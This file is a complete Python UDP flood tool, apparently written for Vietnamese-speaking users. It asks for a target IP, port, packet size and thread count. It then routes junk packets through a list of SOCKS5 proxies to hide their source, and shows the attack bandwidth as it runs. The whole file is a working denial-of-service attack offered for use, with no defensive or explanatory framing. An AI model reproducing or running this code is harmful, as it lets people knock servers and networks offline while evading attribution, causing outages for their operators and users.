import socks
import socket
import random
import threading
import time

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port if port else random.randint(1, 65535)
        self.force = force
        self.threads = threads
        self.on = False
        self.sent = 0
        self.proxies = self.load_proxies()
        self.data = str.encode("x" * self.force)

    def load_proxies(self):
        """ Đọc danh sách proxy SOCKS5 từ file proxy_socks5.txt """
        try:
            with open("proxy_socks5.txt", "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            if not proxies:
                raise Exception("Không tìm thấy proxy hợp lệ trong file.")
            print(f"[+] Đã tải {len(proxies)} proxy SOCKS5.")
            return proxies
        except FileNotFoundError:
            print("[-] Lỗi: File proxy_socks5.txt không tồn tại!")
            exit()

    def get_proxy_socket(self, proxy):
        """ Tạo socket UDP sử dụng proxy SOCKS5 """
        try:
            proxy_ip, proxy_port = proxy.split(":")
            proxy_port = int(proxy_port)

            sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
            return sock
        except Exception as e:
            print(f"[-] Lỗi kết nối proxy {proxy} -> {e}")
            return None

    def flood(self):
        """ Bắt đầu tấn công """
        self.on = True
        print(f"[+] Bắt đầu tấn công {self.ip}:{self.port} bằng toàn bộ proxy SOCKS5...")

        proxy_count = len(self.proxies)
        for i in range(self.threads):
            proxy = self.proxies[i % proxy_count]  # Sử dụng từng proxy lần lượt
            threading.Thread(target=self.send, args=(proxy,)).start()

        threading.Thread(target=self.info).start()

    def send(self, proxy):
        """ Gửi gói tin qua proxy SOCKS5 """
        while self.on:
            try:
                sock = self.get_proxy_socket(proxy)
                if sock:
                    sock.sendto(self.data, (self.ip, self.port))
                    self.sent += len(self.data)
                    sock.close()
            except Exception:
                pass

    def info(self):
        """ Hiển thị tốc độ tấn công """
        while self.on:
            time.sleep(1)
            speed = round(self.sent * 8 / 1e6, 2)
            print(f"[+] Tốc độ tấn công: {speed} Mbps", end="\r")
            self.sent = 0

    def stop(self):
        """ Dừng tấn công """
        self.on = False
        print("\n[-] Đã dừng tấn công!")

def main():
    ip = input("Nhập IP mục tiêu: ")
    try:
        if ip.count('.') != 3:
            raise ValueError
        int(ip.replace('.', ''))
    except:
        print("[-] Lỗi! Vui lòng nhập IP hợp lệ.")
        return

    port = input("Nhập port (Enter để chọn ngẫu nhiên): ")
    port = int(port) if port.isdigit() else None

    force = input("Bytes per packet (Enter để mặc định 1250): ")
    force = int(force) if force.isdigit() else 1250

    threads = input("Nhập số luồng (Enter để mặc định 100): ")
    threads = int(threads) if threads.isdigit() else 100

    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        brute.stop()

if __name__ == "__main__":
    main()
    
